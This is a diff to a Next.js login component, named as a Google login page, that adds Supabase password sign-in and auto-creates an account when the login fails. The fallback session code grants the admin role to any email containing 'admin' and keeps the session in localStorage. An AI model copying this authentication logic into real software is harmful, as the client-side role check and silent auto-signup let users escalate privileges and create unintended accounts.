@@ -4,6 +4,7 @@ import React, { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import { motion, AnimatePresence } from "framer-motion";
 import { Eye, EyeOff, ChevronDown, Globe } from "lucide-react";
+import { supabase } from "@/lib/supabase";
 
 export default function GoogleLoginPage() {
   const router = useRouter();
@@ -43,7 +44,7 @@ export default function GoogleLoginPage() {
     }, 8000);
   };
 
-  const handlePasswordNext = (e: React.FormEvent) => {
+  const handlePasswordNext = async (e: React.FormEvent) => {
     e.preventDefault();
     setPasswordError("");
 
@@ -58,9 +59,58 @@ export default function GoogleLoginPage() {
     }
 
     setLoading(true);
+
+    if (supabase) {
+      try {
+        const { error } = await supabase.auth.signInWithPassword({
+          email: email,
+          password: password
+        });
+
+        if (error) {
+          if (error.message.includes("Invalid login credentials") || error.status === 400) {
+            const { error: signUpError } = await supabase.auth.signUp({
+              email: email,
+              password: password,
+              options: {
+                data: {
+                  name: email.split("@")[0]
+                }
+              }
+            });
+            if (signUpError) {
+              setPasswordError("Authentication failed: " + signUpError.message);
+              setLoading(false);
+              return;
+            }
+            const { error: loginError } = await supabase.auth.signInWithPassword({
+              email: email,
+              password: password
+            });
+            if (loginError) {
+              setPasswordError("Unable to auto-sign in. Please check your verification or try again.");
+              setLoading(false);
+              return;
+            }
+          } else {
+            setPasswordError(error.message);
+            setLoading(false);
+            return;
+          }
+        }
+        
+        setLoading(false);
+        router.push("/");
+        return;
+      } catch (err: any) {
+        setPasswordError("Connection error: " + err.message);
+        setLoading(false);
+        return;
+      }
+    }
+
     setTimeout(() => {
       setLoading(false);
-      // Create user session and save it in localStorage
       const displayName = email.split("@")[0];
       const capitalizedName = displayName.charAt(0).toUpperCase() + displayName.slice(1);
       
@@ -69,7 +119,7 @@ export default function GoogleLoginPage() {
         email: email,
         avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=60",
         streak: 1,
-        role: email.includes("admin") ? "admin" : "user",
+        role: (email.includes("admin") ? "admin" : "user") as "user" | "admin",
         savedCareers: [],
         assessmentHistory: [],
         completedSteps: 0,
@@ -100,8 +150,6 @@ export default function GoogleLoginPage() {
       };
       
       localStorage.setItem("careerverse_user", JSON.stringify(userData));
-      
-      // Navigate back to the career OS
       router.push("/");
     }, 1200);
   };
